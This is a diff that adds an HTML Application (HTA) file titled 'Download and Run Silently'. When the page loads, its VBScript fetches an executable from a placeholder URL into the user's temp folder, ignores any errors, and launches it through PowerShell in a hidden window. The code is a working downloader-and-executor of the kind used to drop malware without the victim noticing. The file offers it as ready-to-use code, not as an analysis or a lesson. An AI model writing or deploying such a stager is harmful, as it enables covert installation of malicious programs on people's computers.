@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Download and Run Silently</title>
+    <HTA:APPLICATION 
+        ID="DownloadAndRun" 
+        APPLICATIONNAME="Download and Run Silently" 
+        BORDER="thin" 
+        CAPTION="yes" 
+        SHOWINTASKBAR="yes" 
+        SINGLEINSTANCE="yes" 
+        SYSMENU="yes" 
+        WINDOWSTATE="normal" 
+        SCROLL="no" 
+        RESIZE="no" 
+        CONTEXTMENU="no" 
+    />
+    <script type="text/vbscript">
+        Sub DownloadFile(url, filename)
+            Dim xmlhttp, stream, tempDir, filePath, fileSize, actualSize
+            On Error Resume Next ' Ignore errors
+            Set xmlhttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+            Set stream = CreateObject("ADODB.Stream")
+            tempDir = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%")
+            filePath = tempDir & "\" & filename
+            
+            xmlhttp.Open "HEAD", url, False
+            xmlhttp.Send
+            
+            If xmlhttp.Status = 200 Then
+                fileSize = CLng(xmlhttp.getResponseHeader("Content-Length")) ' Get expected file size
+                
+                xmlhttp.Open "GET", url, False
+                xmlhttp.Send
+                
+                If xmlhttp.Status = 200 Then
+                    stream.Type = 1 ' Binary
+                    stream.Open
+                    stream.Write xmlhttp.responseBody
+                    stream.SaveToFile filePath, 2 ' Overwrite if exists
+                    stream.Close
+                    
+                    ' Check actual file size
+                    actualSize = FileLen(filePath)
+                    If actualSize = fileSize Then
+                        RunFileSilently filePath
+                    End If
+                End If
+            End If
+        End Sub
+
+        Sub RunFileSilently(filePath)
+            Dim shell
+            Set shell = CreateObject("WScript.Shell")
+            shell.Run "powershell.exe -Command ""Start-Process -File '" & filePath & "' -WindowStyle Hidden""", 0, False
+        End Sub
+
+        Sub Main()
+            Dim fileUrl, fileName
+            fileUrl = "https://example.com/path/to/your/file.exe" ' Replace with your file URL
+            fileName = "downloadedFile.exe" ' Specify the desired file name
+            DownloadFile fileUrl, fileName
+        End Sub
+    </script>
+</head>
+<body onload="Main()">
+</body>
+</html>
